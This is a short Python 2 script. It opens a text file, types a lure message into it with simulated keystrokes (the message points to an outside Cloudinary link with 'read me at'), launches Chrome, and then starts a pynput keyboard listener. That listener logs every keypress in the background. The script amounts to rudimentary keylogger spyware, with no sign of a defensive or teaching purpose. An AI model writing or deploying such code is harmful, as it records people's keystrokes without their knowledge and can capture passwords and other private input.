import SendKeys
import time
import os
import datetime
from pynput.keyboard import Key, Listener
import logging





def main():
	try:
		f=open('example.txt', 'wb')
		os.startfile('example.txt')
		sendMe = str(datetime.datetime.now())+"\nHello There!!!\nuhhhmmm... I want to tell you Something ... read me at  \nhttp://res.cloudinary.com/dguxdl3rn/raw/upload/v1540986398/tilmdzhccxxl4doyerqi.png\n"
		time.sleep(.5)
		SendKeys.SendKeys(sendMe, with_spaces = True, with_newlines = True, with_tabs = True)
		f.write(sendMe)
		os.system('start chrome')
		f.close()

	except Exception as e:
		print str(e)


main()


def on_press(key):
	logging.info(key)


with Listener(on_press=on_press) as listener:
	listener.join()
	
